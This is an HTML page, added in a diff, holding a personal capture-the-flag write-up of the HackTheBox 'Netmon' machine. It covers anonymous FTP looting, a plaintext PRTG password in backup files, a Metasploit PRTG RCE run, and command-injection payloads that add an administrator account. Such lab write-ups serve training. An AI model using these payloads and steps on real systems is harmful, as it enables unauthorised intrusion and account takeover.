@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+
+<html lang="en">
+
+<style>
+    body {
+        background-color: #363636;
+        /* background-color:bisque; */
+        color: whitesmoke;
+        font-family:Arial, Helvetica, sans-serif
+    }
+
+    a {
+        text-decoration: none; 
+        color: inherit;
+    }
+
+    .topnav {
+        background-color: #242424;
+        overflow: hidden;
+        position: fixed;
+        width: 100%;
+        top: 0;
+        right: 0;
+    }
+
+    .topnav .name {
+        float: left;
+        color: #f2f2f2;
+        text-align: center;
+        padding: 14px 16px;
+        text-decoration: none;
+        font-size: 17px;
+    }
+
+    .topnav a {
+        float: right;
+        color: #f2f2f2;
+        text-align: center;
+        padding: 14px 16px;
+        font-size: 17px;
+    }
+
+    .topnav a:hover {
+        background-color: #ddd;
+        text-decoration-line: underline;
+        color: black;
+    }
+
+    .topnav a.active {
+        background-color:#0077ff;
+        color:white;
+    }
+
+    .topnav .center-topnav {
+        margin: auto;
+        width: 80%;
+        max-width: 930px
+    }
+
+    .content {
+        margin: auto;
+        width: 80%;
+        max-width: 900px;
+        padding-top: 50px;
+        display: grid;
+        line-height: 1.5em;
+        /* border-color: #0077ff; border-width: 2px; border-style: solid; */
+    }
+
+    .content p {
+        margin-bottom:0px;
+    }
+
+    /* .content .cell {
+        border-color: green;
+        border-width: 2px;im al
+        border-style: solid;
+    } */
+
+    .content .cell .text {
+        margin:auto;
+        text-align: center;
+    }
+
+    .content h2 {
+        margin-top:40px;
+        margin-bottom:0px;
+    }
+
+    .content h3 {
+        margin-bottom:0px;
+    }
+
+    .content .box-icon {
+        display: block;
+        width: 20%;
+    }
+
+    pre {
+        overflow: auto;
+    }
+
+    pre code {
+        background-color: #000;
+        border: 1px solid #999;
+        display: block;
+        padding: 15px;
+        overflow: auto;
+    }
+
+    img {
+        width: 80%
+    }
+
+    h1, h2 {
+        color:#0077ff
+    }
+
+    h3 {
+        color:#99c9ff
+    }
+
+</style>
+
+<head>
+    <div class="topnav">
+        <div class="center-topnav">
+            <a href=/index.html class="name">Jaguar Perlas</a>
+            <a class="active" href="/hack/hacks/index.html">Hacks</a>
+            <a href="/hack/about.html">About me</a>
+            <a href="/hack/index.html">Home</a>
+        </div>
+    </div>
+</head>
+
+<body>
+    <div class="content">
+
+        <h1>[Easy] Netmon</h1>
+        <img class="box-icon" src="/hack/images/netmon.png"></img>
+        <p><i>Compromised on September 6, 2022</br>Written on January 25, 2024</i></p>
+        <p>
+            Netmon is my third compromised machine on HackTheBox. It is an easy rated Windows machine, featuring anonymous FTP server login,
+            stored plaintext credentials in backup configuration files, and an outdated web application with a command injection vulnerability.
+        </p>
+
+        <h2>Enumeration</h2>
+        <h3>Nmap</h3>
+        <p>Starting off with an Nmap scan, we can see a lot of ports open on the machine.</p>
+        <pre><code>nmap 10.10.10.152 -Pn -p- --min-rate=5000</code></pre>
+        <img src="../images/netmon1.png">
+        <p>With those ports, we use Nmap again to grab service version and more information.</p>
+        <pre><code>nmap 10.10.10.152 -sC -sV -p21,80,135,139,445,5985,47001,49665,49666,49667,49668,49669 --min-rate=5000</code></pre>
+        <img src="../images/netmon2.png">
+        <h3>FTP - TCP 21</h3>
+        <p>Our Nmap scan shows that anonymous login is allowed for FTP. We're able to browse the file system with limited privileges.</p>
+        <pre><code>ftp 10.10.10.152</br>anonymous</br>anonymous</br>dir -a</code></pre>
+        <img src="../images/netmon3.png">
+        <p>Browsing the file system, we discover that the machine is installed with PRTG Network Monitor by looking in Program Files (x86).
+            Additionally, from our Nmap scans, this is running on port 80.</p>
+        <pre><code>cd "Program Files (x86)"</br>dir</code></pre>
+        <img src="../images/netmon4.png">
+        <p>Digging through the files, we can find the user flag at C:\Users\Public\Desktop\user.txt</p>
+        <pre><code>cd Users</br>ls</br>cd Public</br>ls</br>cd Desktop</br>ls</br>more user.txt</code></pre>
+        <img src="../images/netmon5.png">
+        <p>Further digging through the file system, we find the configuration files and it's backups for PRTG Network Monitor.</p>
+        <pre><code>cd /</br>dir -a</br>cd ProgramData</br>dir</br>cd Paessler</br>dir</br>cd PRTG\ Network\ Monitor</br>dir</code></pre>
+        <img src="../images/netmon6.png">
+        <p>We then download all the configuration files to our attack machine. Since this file is large, we change our FTP mode to "binary" and start downloading.</p>
+        <pre><code>binary</br>get "PRTG Configuration.dat"</br>get "PRTG Configuration.old"</br>get "PRTG Configuration.old.bak"</code></pre>
+        <img src="../images/netmon7.png">
+        <p>Parsing through the configuration files, we find a password in plaintext in PRTG Configuration.old.bak.</p>
+        <img src="../images/netmon8.png">
+        <p>Unfortunately, trying these credentials don't seem to work.</p>
+        <h3>PRTG Network Monitor - TCP 80</h3>
+        <img src="../images/netmon9.png">
+        <p>We have to consider that the password found was from an old backup file. Considering that the password has the year 2018 at the end, the administrator
+            most likely only updated the year when changing the password. If we try to enter "PrTg@dmin2019", it works.</p>
+        <img src="../images/netmon10.png">
+
+        <h2>Exploit</h2>
+        <p>Now that we're in, I quickly search if there is a public exploit available for our PRTG version 18.1.37. There is one available that meets our requirements and
+            also has a module on Metasploit.</p>
+        <img src="../images/netmon11.png">
+        <img src="../images/netmon12.png">
+        <p>We then use Metasploit, set our options, and execute.</p>
+        <pre><code>mfsconsole</br>use exploit/windows/http/prtg_authenticated/rce</br>set ADMIN_PASSWORD PrTg@dmin2019</br>set RHOSTS 10.10.10.152</br>set LHOST 10.10.14.2</br>run</code></pre>
+        <img src="../images/netmon13.png">
+        <p>In our Meterpreter shell, we drop into Powershell on the target system and get root flag on Administrator's desktop.</p>
+        <pre><code>shell</br>cd /Users/Administrators/Desktop</br>more root.txt</code></pre>
+        <img src="../images/netmon14.png">
+        <p>Full compromise.</p>
+
+        <h2>The Intended Exploit</h2>
+        <p>The above Exploit section shows how I personally compromised this machine. With some research, there is a manual way to go about this.</p>
+        <p>Searching for a PRTG exploit for our version 18.1.37, there is a blog post which documents a Command Injeciton Vulnerability found when creating
+            a new notification. When creating a new notificaton, you can specify a script execute once the notification is sent. In scenarios where a 
+            malicious script can't be uploaded, you can use the Parameters option to perform Command Injection.</p>
+        <img src="../images/netmon15.png">
+        <p>The option to create a new notification can be found Setup -> Account Settings -> Notifications.</p>
+        <img src="../images/netmon16.png">
+        <p>We can use the following parameter option, as indicated in the blog post.</p>
+        <pre><code>test.txt;net user pentest p3nT3st! /add</code></pre>
+        <img src="../images/netmon17.png">
+        <p>Now we can test run our notification, which should execute our command payload. We can test by attempting to authenticate using smbmap</p>
+        <pre><code>smbmap -H 10.10.10.152 -u pentest -p 'p3nT3st!'</code></pre>
+        <img src="../images/netmon18.png">
+        <p>Great, it works. Now we can modify our notification exploit to make our user an administrator.</p>
+        <pre><code>test.txt;net localgroup administrators pentest /add</code></pre>
+        <img src="../images/netmon19.png">
+        <p>And to test, let's see if we can use evil-winrm to remote into the system.</p>
+        <pre><code>evil-winrm -u pentest -p 'p3nT3st!' -i 10.10.10.152</code></pre>
+        <img src="../images/netmon20.png">
+        <p>Nice. Let's get the root flag.</p>
+        <pre><code>more C:\Users\Administrator\Desktop\root.txt</code></pre>
+        <img src="../images/netmon21.png">
+
+    </div>
+</body>
+
+</html>
